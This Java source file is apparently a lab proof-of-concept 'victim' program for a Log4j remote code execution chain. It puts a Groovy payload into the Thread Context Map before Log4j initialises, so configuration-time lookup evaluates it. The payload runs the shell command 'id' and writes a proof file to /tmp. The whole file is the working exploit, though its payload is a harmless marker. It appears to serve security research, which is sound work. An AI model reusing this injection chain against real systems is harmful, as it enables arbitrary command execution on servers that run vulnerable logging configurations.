package lab;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

/**
 * Same chain, but the Thread Context Map is populated *before* Log4j is initialised.
 * The configuration is therefore substituted while the untrusted value is already in the
 * MDC - no reconfiguration needed.
 */
public final class VictimScript2 {

    private static final String GROOVY_PAYLOAD =
            "def proc = 'id'.execute()\n"
                    + "proc.waitFor()\n"
                    + "def sb = new StringBuffer()\n"
                    + "proc.in.eachLine { sb << it + '\\n' }\n"
                    + "def pid = ProcessHandle.current().pid()\n"
                    + "def who = System.getProperty('user.name')\n"
                    + "def proof = new File('/tmp/log4j-lab-pwned.txt')\n"
                    + "proof.text = 'RCE via log4j script (config-time lookup evaluation) as ' + who + ' pid=' + pid + '\\n' + sb.toString()\n"
                    + "println '=== PAYLOAD EXECUTED IN VICTIM JVM (script) ==='\n"
                    + "println proof.text\n"
                    + "println '=== END PAYLOAD ==='\n"
                    + "true\n";

    public static void main(final String[] args) {
        ThreadContext.put("scriptText", GROOVY_PAYLOAD); // before Log4j is initialised
        final Logger log = LogManager.getLogger("victim"); // configuration load happens here
        log.info("request handled");
        ThreadContext.clearMap();
        System.out.println("VICTIM: logged");
    }

    private VictimScript2() {}
}
